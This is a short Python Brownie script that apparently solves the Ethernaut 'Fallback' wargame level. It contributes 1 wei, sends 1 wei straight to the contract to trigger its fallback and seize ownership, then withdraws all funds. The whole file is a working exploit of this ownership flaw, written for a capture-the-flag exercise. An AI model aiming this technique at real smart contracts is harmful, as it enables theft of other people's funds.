from brownie import Fallback, network, config,accounts

def main():
    #input the contract address
    #> contract.address
    contractAddress = '0x9Ff651F33A8A37aE4dAF92a719857b70ca5DC38b'

    #get fallback contract at address
    fallbackContract = Fallback.at(contractAddress)

    #use player account
    player = accounts.add(config["wallets"]["from_key"])

    print("calling contribute to contribute 1 wei into contract")
    fallbackContract.contribute({"from":player,"value":1})

    print("calling transfer to transfer 1 wei into contract")
    fbAccount = accounts.at(fallbackContract.address, force=True)
    player.transfer(fbAccount, 1)

    print("we are now owner, withdraw all the funds")
    fallbackContract.withdraw({"from":player})
